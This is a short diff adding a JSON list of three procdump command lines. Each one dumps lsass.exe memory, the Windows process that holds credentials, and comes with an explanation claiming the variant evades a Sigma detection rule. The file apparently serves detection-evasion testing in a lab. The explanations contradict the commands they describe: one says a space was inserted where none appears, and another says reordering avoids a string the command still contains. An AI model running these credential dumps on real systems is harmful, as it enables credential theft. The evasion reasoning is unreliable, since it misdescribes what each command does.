@@ -1,0 +1,14 @@
+[
+  {
+    "output": "procdump.exe -ma -o C:\\Lab\\out\\dump.7z lsass.exe",
+    "explanation": "Reordering: The command-line arguments are reordered to place the output path before the target process, which may avoid the ' -ma ' string match in the Sigma rule."
+  },
+  {
+    "output": "procdump.exe -ma lsass.exe -o C:\\Lab\\out\\dump.7z",
+    "explanation": "Insertion: A space is inserted after the '-ma' flag, changing the string pattern and potentially avoiding the ' -ma ' match in the Sigma rule."
+  },
+  {
+    "output": "procdump.exe -ma lsass.exe C:\\Lab\\out\\dump.7z",
+    "explanation": "Omission: The '-o' flag is omitted, relying on default output behavior, which may avoid the Sigma rule's detection based on the explicit '-o' flag."
+  }
+]
